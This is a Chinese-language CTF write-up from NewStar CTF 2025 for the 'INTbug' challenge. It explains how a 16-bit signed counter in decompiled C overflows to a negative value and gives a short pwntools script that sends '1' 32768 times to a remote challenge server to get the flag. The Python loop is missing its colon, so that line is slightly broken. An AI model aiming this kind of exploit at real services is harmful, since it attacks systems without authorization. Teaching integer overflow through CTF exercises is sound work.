---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# INTbug

本题考察的是整数溢出

```c
unsigned __int64 func()
{
  __int16 v1; // [rsp+2h] [rbp-Eh]
  int v2; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0;
  while ( 1 )
  {
    v2 = 0;
    __isoc99_scanf(&unk_2008, &v2);
    if ( v2 <= 0 )
      break;
    if ( ++v1 < 0 )
    {
      puts("You got it!\n");
      system("cat flag");
    }
  }
  puts("You can only input positive number!\n");
  return v3 - __readfsqword(0x28u);
}
```

程序的逻辑很简单，输入正数 `v1` 就会加 1，如果 `v1` 小于0，那么就可以拿到 flag。

`v1` 是 `__int16` ，2 字节有符号整数，范围在 0~32767<span data-desc>(0~0x7fff)</span> ，-32768\~-1<span data-desc>(0x8000~0xffff)</span>。

因此只要 `v1>0x7fff`，就可以让 `v1` 变成负数，拿到 flag，利用 pwntools 写一个循环即可。

```python
from pwn import *
p = remote("",)
for i in range(0x7fff+1)
	p.sendline(b"1")
p.interactive()
```

